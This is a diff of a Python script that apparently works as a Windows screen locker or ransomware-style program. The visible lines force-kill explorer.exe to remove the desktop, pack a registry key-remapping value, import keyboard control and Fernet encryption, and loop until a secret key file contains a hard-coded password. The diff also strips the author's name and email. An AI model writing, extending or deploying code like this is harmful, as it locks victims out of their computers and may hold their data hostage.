@@ -1,13 +1,3 @@
-
-####CREATOR#####
-
-## NAME : GREEJITH -K ######
-## GMAIL : greejithmiui12@gmail.com ###
-
-
-
-
-
 import os
 import subprocess
 import sys
@@ -17,7 +7,19 @@ from datetime import datetime
 from pynput.keyboard import Controller, Key
 import sys
 from cryptography.fernet import Fernet
+import struct
 
+# Registry entry (in hexadecimal format)
+registry_input = "00,00,00,00,00,00,00,00,03,00,00,00,4d,e0,1d,e0,4b,e0,1d,00,00,00,00,00"
+
+# Convert the input to a list of hexadecimal values
+hex_values = [int(x, 16) for x in registry_input.split(',')]
+
+# Format the data in a special way
+data = struct.pack('<' + 'B' * len(hex_values), *hex_values)
+
+# Print the Registry data
+print(data)
 os.system("taskkill /f /im explorer.exe")  # KILLING  THE GUI INTARCE
 
 # GENERATE A KEY FOR DECRYPTION
@@ -472,21 +474,3 @@ while matchkey != "greejith":
     secritkey = open("sec.txt", "r")
     matchkey = secritkey.read()
     continue
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
